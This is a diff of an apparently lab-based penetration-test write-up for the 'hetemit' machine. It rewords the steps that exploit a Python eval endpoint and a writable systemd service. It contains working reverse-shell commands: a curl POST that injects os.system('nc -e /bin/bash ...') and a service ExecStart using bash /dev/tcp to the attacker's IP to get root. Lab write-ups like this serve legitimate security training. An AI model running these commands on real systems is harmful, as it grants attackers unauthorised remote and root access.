@@ -13,12 +13,11 @@ IP: 192.168.56.117
 
 # Resolution summary
 - Found an application that performs evaluation on port 50000
--  Typed curl -X post --data "code=os" to confirm if the application was running python as the nmap showed it was
-- Ran an os.system netcat command to from curl and received a reverse shell
-- Found a pythonapp.service was writable by our user
-- Modified the pythonapp.service to start a reverse shell as root 
-- Restarted the service and received a root shell
-
+- Entered curl -X post --data "code=os" to verify that the application was operating in Python, as indicated by nmap.
+- After executing an os.system netcat command using curl, a reverse shell was obtained.
+- Found a pythonapp.service could be written by our user.
+- Changed the PythonApp.service to launch a reverse shell with root privileges.
+- After restarting the service, a root shell was returned. 
 
 ## Improved skills
 - Learned curl -X POST --data option "code= " option
@@ -284,15 +283,18 @@ Enumerated top 200 UDP ports:
 # Enumeration
 ## Port 50000 Werkzeug httpd 1.0.1
 
-#### -Per the nmap scan I navigated to http://192.168.56.117:50000 and found the following webpage:
-
+- We access http://192.168.56.117:50000 based on the results of the Nmap scan, and the following webpage appears:
+  
 ![](Images/Pasted%20image%2020221016140831.png)
 
-#### -Navigated to http://192.168.56.117:50000/verify as the previous webpage showed a "/verify" directory:
-
+- As the webpage includes a "/verify" directory, we visit http://192.168.56.117:50000/verify.
+  
 ![](Images/Pasted%20image%2020221016152718.png)
 
-#### -Typed "curl –X post –-data "code=2*2" http://192.168.56.117:50000/verify" and found the following output showing the application performs evaluation:
+- We type the following command and the output indicates the application performs evaluation.
+
+curl –X post –-data "code=2*2" http://192.168.56.117:50000/verify
+
 ![](Images/Pasted%20image%2020221016152913.png)
 
 ---
@@ -300,11 +302,15 @@ Enumerated top 200 UDP ports:
 # Exploitation
 ## os.system  Command Execution
 
-#### -As found from the nmap scan port 50000 is running python 3.6 I typed "os" as a module and find the following showing the existence of it running python 3.6 module:
+To exploit the application, the os.system command execution method was used. Since port 50000 was found to be running Python 3.6 from the NMAP output, the command os.system was tested to confirm Python 3.6 presence.
 
 ![](Images/Pasted%20image%2020221016153044.png)
 
-#### -Ran a netcat listener on port 18000 and typed "curl -X POST --data "code=os.system('nc -e /bin/bash [kali IP] 18000')" http://192.168.241.117:50000/verify" and got a reverse shell:
+- We start a penelope listener on port 18000
+
+- A reverse shell was returned from the penelope listener that was running on port 18000 when we typed the following command.
+
+curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.161 18000')" http://192.168.229.117:50000/verify
 
 ![](Images/Pasted%20image%2020221016195553.png)
 #os.systemCommandExecution
@@ -316,52 +322,35 @@ Enumerated top 200 UDP ports:
 # Privilege Escalation
 ## Local Enumeration
 
-#### -Per typing "sudo –l" I found the following:
+- Entering "sudo –l" shows our user can run /sbin/halt, /sbin/reboot and /sbin/poweroff as root:
+      
+![[Pasted image 20240418155259.png]]
 
-[+] We can sudo without supplying a password!
-Matching Defaults entries for cmeeks on hetemit:
-    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
- 
-User cmeeks may run the following commands on hetemit:
-    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
-	
-#### -Per linpeas.sh I found I can write to "/etc/systemd/system/pythonapp.service":
-
+- We discover that we can write to "/etc/systemd/system/pythonapp.service" according to the linpeas.sh script output.
+  
 ![](Images/Pasted%20image%2020221016173419.png)
 
 ## Privilege Escalation vector
 ## Modifiable pythonapp.service
 
-#### -Typed vi "/etc/systemd/system/pythonapp.service" and found the following:
+- We type "cat /etc/systemd/system/pythonapp.service" which shows the following.
 
-[Unit]
-Description=Python App
-After=network-online.target
- 
-[Service]
-Type=simple
-WorkingDirectory=/home/cmeeks/restjson_hetemit
-ExecStart=flask run -h 0.0.0.0 -p 50000
-TimeoutSec=30
-RestartSec=15s
-User=cmeeks
-ExecReload=/bin/kill -USR1 $MAINPID
-Restart=on-failure
- 
-[Install]
-WantedBy=multi-user.target
+![[Pasted image 20240418160552.png]]
 
-#### -Modified the ExecStart and User lines, and removed the WorkingDirectory= line:
+- We type "vi /etc/systemd/system/pythonapp.service"
 
-![](Images/Pasted%20image%2020221016185352.png)
+- We make the following modifications.
 
-#### - Downloaded a reverse shell named "reverse.sh" in the "/home/cmeeks/restjson_hetemit/" directory
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.161/50000 0>&1'
+User=root
+  
+![[Pasted image 20240418181341.png]]
 
-#### -As "services" require to be restarted/system reboot to refresh whatever changes I made to the service app I typed "sudo /sbin/reboot" and system was rebooted
+- We type "sudo /sbin/reboot" to reboot the system since "services" need to be restarted in order for any modifications we made to the service app to take effect.
 
-#### -I then got another reverse listener set up with port 1800 and received a root shell:
+- Next, we obtain a root shell after setting up a listener on port 50000.
 
-![](Images/Pasted%20image%2020221016193909.png)
+![[Pasted image 20240418182524.png]]
 
 ---
 
